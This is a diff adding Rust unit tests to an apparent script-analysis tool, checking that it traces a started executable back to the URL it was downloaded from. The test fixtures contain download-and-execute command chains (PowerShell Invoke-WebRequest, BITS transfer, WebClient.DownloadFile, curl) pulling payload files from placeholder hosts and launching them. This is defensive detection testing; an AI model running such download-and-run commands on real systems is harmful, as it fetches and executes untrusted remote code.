@@ -4267,6 +4267,69 @@ start "" "C:\Users\Public\payload.exe""#,
     }
 
     #[test]
+    fn start_local_target_resolves_prior_powershell_iwr_outfile_source_url() {
+        let report = analyze(
+            br#"powershell -Command "Invoke-WebRequest -Uri 'https://start-ps-iwr.example/payload.exe' -OutFile 'C:\Users\Public\payload.exe'"
+start "" "C:\Users\Public\payload.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\payload.exe""#
+                            && url == "https://start-ps-iwr.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve prior PowerShell IWR download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_local_target_resolves_prior_powershell_bits_destination_source_url() {
+        let report = analyze(
+            br#"powershell -Command "Start-BitsTransfer -Source 'https://start-ps-bits.example/payload.exe' -Destination 'C:\Users\Public\payload.exe'"
+start "" "C:\Users\Public\payload.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\payload.exe""#
+                            && url == "https://start-ps-bits.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve prior PowerShell BITS download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_local_target_resolves_second_powershell_downloadfile_destination_source_url() {
+        let report = analyze(
+            br#"powershell -Command "(New-Object Net.WebClient).DownloadFile('https://start-ps-dlfile.example/payload.exe','C:\Users\Public\first.exe');(New-Object Net.WebClient).DownloadFile('https://start-ps-dlfile.example/payload.exe','C:\Users\Public\second.exe')"
+start "" "C:\Users\Public\second.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\second.exe""#
+                            && url == "https://start-ps-dlfile.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve second PowerShell DownloadFile destination: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_current_dir_local_target_resolves_prior_download_source_url() {
         let report = analyze(
             br#"curl -o payload.hta https://start-dot-source.example/payload.hta
